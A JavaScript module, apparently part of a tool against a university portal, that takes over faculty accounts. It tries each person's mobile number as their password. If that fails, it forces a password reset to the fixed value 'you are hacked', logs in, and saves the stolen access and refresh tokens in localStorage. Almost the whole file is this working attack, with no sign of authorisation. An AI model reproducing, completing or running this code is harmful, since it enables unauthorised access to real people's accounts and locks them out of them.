import {
  impersonateTryLogin,
  impersonateResetPassword,
  impersonateLogin,
} from "./client.js";

const IMPERSONATION_KEY = "vtu_impersonation";
const NEW_PASSWORD = "you are hacked";

/* ── state ─────────────────────────────────────────────────── */
export function loadImpersonation() {
  try {
    return JSON.parse(localStorage.getItem(IMPERSONATION_KEY) || "null");
  } catch {
    return null;
  }
}

export function saveImpersonation(data) {
  localStorage.setItem(IMPERSONATION_KEY, JSON.stringify(data));
}

export function clearImpersonation() {
  localStorage.removeItem(IMPERSONATION_KEY);
}

/* ── full flow ─────────────────────────────────────────────── */
/**
 * Attempts to log in as a faculty member.
 *   1. Try email + mobile
 *   2. If that fails, reset password to NEW_PASSWORD
 *   3. Try email + NEW_PASSWORD
 *   4. Persist the resulting token + user under `vtu_impersonation`
 * Returns { ok, user, token } or { ok:false, reason }
 */
export async function impersonateFaculty(faculty) {
  const email = faculty.email;
  const mobile = faculty.mobile;

  if (!email) return { ok: false, reason: "This faculty has no email on record." };

  // 1. try login with mobile
  try {
    const r = await impersonateTryLogin(email, mobile);
    if (r.ok) {
      const login = r.login;
      saveImpersonation({
        user: login.user,
        access: login.token.access,
        refresh: login.token.refresh,
        started_at: new Date().toISOString(),
        viaMobile: true,
      });
      return { ok: true, user: login.user, viaMobile: true };
    }
  } catch {
    /* continue to reset path */
  }

  // 2. reset password
  let resetResult;
  try {
    resetResult = await impersonateResetPassword(email);
  } catch (err) {
    return { ok: false, reason: err?.response?.data?.message || "Password reset failed." };
  }
  if (!resetResult?.ok) {
    return { ok: false, reason: resetResult?.message || "Password reset failed." };
  }

  // 3. login with the new password
  try {
    const r = await impersonateLogin(email, NEW_PASSWORD);
    if (r.ok) {
      saveImpersonation({
        user: r.login.user,
        access: r.login.token.access,
        refresh: r.login.token.refresh,
        started_at: new Date().toISOString(),
        viaMobile: false,
        passwordReset: true,
        newPassword: NEW_PASSWORD,
      });
      return { ok: true, user: r.login.user, viaMobile: false, passwordReset: true };
    }
    return { ok: false, reason: r.message || "Login with reset password failed." };
  } catch (err) {
    return { ok: false, reason: err?.response?.data?.message || "Login failed." };
  }
}